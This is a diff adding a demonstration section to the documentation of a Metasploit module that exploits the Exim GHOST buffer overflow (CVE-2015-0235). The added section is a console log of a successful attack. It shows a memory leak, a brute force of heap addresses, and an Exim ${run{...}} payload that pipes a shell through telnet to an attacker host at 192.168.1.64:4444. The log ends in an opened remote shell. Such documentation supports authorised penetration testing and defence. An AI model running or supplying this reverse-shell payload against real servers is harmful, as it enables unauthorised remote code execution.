@@ -47,6 +47,62 @@ If the exim_gethostbyname_bof.rb module has failed on you:
 | Brute-force SUCCESS" followed by a nil reply, but no shell | the remote Unix command was executed, but spawned a bind-shell or a reverse-shell that failed to connect (maybe because of a firewall, or a NAT, etc). |
 | Brute-force SUCCESS" followed by a non-nil reply, and no shell | The remote Unix command was executed, but failed to spawn the shell (maybe because the setsid command doesn't exist, or awk isn't gawk, or netcat doesn't support the -6 or -e option, or telnet doesn't support the -z option, etc). |
 
+## Module Demonstration
+
+When everything is dialed in correctly, a successful attack should look like the following:
+
+```
+msf exploit(exim_gethostbyname_bof) > run
+
+[*] Started reverse double handler
+[*] Trying information leak...
+[!] {:heap_shift=>736}
+[!] {:write_offset=>128, :error=>"503 sender not yet given"}
+[!] {:write_offset=>136, :error=>"\xE0.\xFF\xB7\xE0.\xFF\xB7er not yet given"}
+[!] {:error=>["\xE0.\xFF\xB7\xE0.\xFF\xB7er not yet given", "", "503 \x89\x10", "177", "177\\177\\177", "vJN\\177\\177\\177\\177"]}
+[!] {:leaked_arch=>"x86"}
+[!] {:count=>{"\xE0.\xFF\xB7\xE0.\xFF\xB7er not yet given"=>8, "hF\xFE\xB7hF\xFE\xB7er not yet given"=>2}}
+[+] Successfully leaked_arch: x86
+[+] Successfully leaked_addr: b7fda760
+[*] Trying code execution...
+[!] ${run{/usr/bin/env setsid /bin/sh -c "sh -c '(sleep 4011|telnet 192.168.1.64 4444|while : ; do sh && break; done 2>&1|telnet 192.168.1.64 4444 >/dev/null 2>&1 &)'"}}
+[!] {:helo=>6144, :step=>6025, :addr=>"b7fda760", :offset=>21}
+[!] {:reply=>{:code=>"250", :lines=>["250 Accepted\r\n"]}}
+[!] {:helo=>6144, :step=>6025, :addr=>"b7fda760", :offset=>25}
+[!] {:reply=>{:code=>"250", :lines=>["250 Accepted\r\n"]}}
+[!] {:helo=>6144, :step=>6025, :addr=>"b7fd8fd7", :offset=>20}
+[!] {:helo=>6144, :step=>6025, :addr=>"b7fd8fd7", :offset=>8}
+[!] {:helo=>6144, :step=>6025, :addr=>"b7fd784e", :offset=>6}
+[!] {:helo=>6144, :step=>6025, :addr=>"b7fd784e", :offset=>12}
+[!] {:helo=>6144, :step=>6025, :addr=>"b7fd60c5", :offset=>19}
+[!] {:helo=>6144, :step=>6025, :addr=>"b7fd60c5", :offset=>29}
+[!] {:helo=>6144, :step=>6025, :addr=>"b7fd493c", :offset=>23}
+[!] {:helo=>6144, :step=>6025, :addr=>"b7fd493c", :offset=>18}
+[!] {:helo=>6144, :step=>6025, :addr=>"b7fd31b3", :offset=>14}
+[!] {:helo=>6144, :step=>6025, :addr=>"b7fd31b3", :offset=>3}
+[!] {:helo=>6144, :step=>6025, :addr=>"b7fd1a2a", :offset=>29}
+[!] {:helo=>6144, :step=>6025, :addr=>"b7fd1a2a", :offset=>28}
+[!] {:helo=>6144, :step=>6025, :addr=>"b7fd02a1", :offset=>26}
+[!] {:reply=>{:code=>"550", :lines=>["550 sikVtqGxFOjCBOWTbDupmIuJRmLmShFNqqUYRRPUolyxPmmgLCenEzConuVGWafjgycyRfXulGNwmAOvkqZkGobMyUIMPojZsaziCjVVyvabOrcieEWrLZSgnCCXHeXjIzGGfUALAIubgBEmsKsSWSGa\r\n"]}}
+[+] Brute-force SUCCESS
+[+] Please wait for reply...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo qaNpBmRBEus9XoVZ;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket A
+[*] A: "qaNpBmRBEus9XoVZ\r\n"
+[*] Matching...
+[*] B is input...
+[*] Command shell session 1 opened (192.168.1.64:4444 -> 192.168.1.166:58859) at 2015-03-19 03:36:52 -0500
+[!] {:reply=>nil}
+
+id
+uid=104(Debian-exim) gid=112(Debian-exim) groups=112(Debian-exim)
+```
+
 ## References:
 
 * https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0235
